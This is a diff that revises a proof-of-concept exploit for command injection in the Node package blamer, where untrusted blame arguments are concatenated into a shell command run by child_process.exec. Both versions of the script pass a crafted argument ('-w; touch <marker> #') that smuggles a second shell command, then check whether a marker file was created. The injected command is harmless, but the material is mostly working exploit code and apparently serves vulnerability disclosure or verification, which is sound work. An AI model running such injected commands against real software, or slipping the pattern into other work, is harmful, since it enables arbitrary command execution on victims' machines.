@@ -1,22 +1,25 @@
-```javascript
-// Exploit for command injection in blamer's git.js `exec` sink
-// blamer < fix concatenates the (attacker-controlled) blame options directly
-// into a shell string passed to child_process.exec, e.g.:
-//   exec('git blame ' + options + ' ' + basename, { cwd: dirname, ... })
-// Supplying a crafted `options` argument breaks out of the intended command.
+The vulnerability is command injection in `node_modules/blamer/src/vcs/git.js`: the `exec` function builds a shell command via string concatenation of the untrusted `args` (revision) parameter — `'git blame ' + args + ' ' + filename` — with no sanitization, then passes it to Node's `child_process.exec`, which spawns a shell.
 
-const Blamer = require("./node_modules/blamer");
+```javascript
+const path = require("path");
+const fs = require("fs");
+const os = require("os");
+const Blamer = require("./node_modules/blamer/src/index.js");
+
+const marker = path.join(os.tmpdir(), "blamer_pwned_" + Date.now());
+const targetFile = __filename; // any existing file works as the "blamed" file
 
 const blamer = new Blamer("git");
-const marker = "/tmp/blamer_pwned_" + Date.now();
 
-blamer.blameByFile(__filename, `-w; touch ${marker} #`)
-  .then(() => console.log("blame() resolved"))
-  .catch(() => console.log("blame() rejected (harmless, injection already ran)"))
-  .then(() => {
-    setTimeout(() => {
-      const exists = require("fs").existsSync(marker);
-      console.log(exists ? `VULNERABLE: injected command executed, created ${marker}` : "not vulnerable");
-    }, 200);
+// The second argument to blameByFile is concatenated unsanitized into
+// `git blame <args> <file>` and executed via child_process.exec (shell:true),
+// so shell metacharacters let us inject arbitrary commands.
+const maliciousArgs = `-w; touch ${marker} #`;
+
+blamer.blameByFile(targetFile, maliciousArgs)
+  .then(() => console.log("blame finished"))
+  .catch(() => console.log("blame errored (expected, injected cmd still ran)"))
+  .finally(() => {
+    console.log("Injection succeeded:", fs.existsSync(marker));
   });
 ```
